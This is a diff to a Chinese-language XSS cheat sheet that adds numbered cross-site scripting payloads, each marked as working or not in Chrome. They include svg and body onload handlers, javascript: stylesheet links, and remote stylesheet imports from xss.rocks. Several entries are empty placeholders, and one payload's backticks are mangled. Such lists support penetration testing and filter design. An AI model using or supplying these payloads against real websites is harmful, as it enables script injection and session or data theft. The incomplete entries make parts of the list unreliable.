@@ -47,6 +47,55 @@
 
 `（注意：LiveScript是JavaScript语言的前身）`
 
+### 2-40 Svg对象标签 (chrome测试生效)
+`<svg/onload=alert('XSS')>`
+
+### 2-41 es6 (chrome测试无效)
+`Set.constructor`alert\x28document.domain\x29````
+
+### 2-42 body标签 (chrome测试生效)
+
+`<BODY ONLOAD=alert('XSS')>`
+
+### 2-43 事件处理程序
+
+### 2-44 BGSOUND (chrome测试无效)
+
+`<bgsound>是IE浏览器中设置网页背景音乐的元素。该特性是非标准的，请尽量不要在生产环境中使用它！`
+
+### 2-45 & JavaScript includes (chrome测试无效)
+
+`<BR SIZE="&{alert('XSS')}">`
+
+### 2-46 stylesheet样式表引入 (chrome测试无效)
+
+`<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`
+
+### 2-47 远程样式表 （chrome测试无效）
+
+`<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">`
+
+### 2-48 远程样式表2 (chrome测试无效)
+`<STYLE>@import'http://xss.rocks/xss.css';</STYLE>`
+
+### 2-49 远程样式表3 （chrome测试无效）
+
+`<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">`
+
+### 2-50 远程样式表4 (chrome测试无效)
+
+`<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>`
+
+
+### 2-51
+
+
+
+
+
+
+
+
 ### 2-60 META
 META标签可以设置刷新，这个刷新功能比较奇怪的是并不会在头部中发送一个referrer，所以它通常用于不需要 referrer 的时候:
 
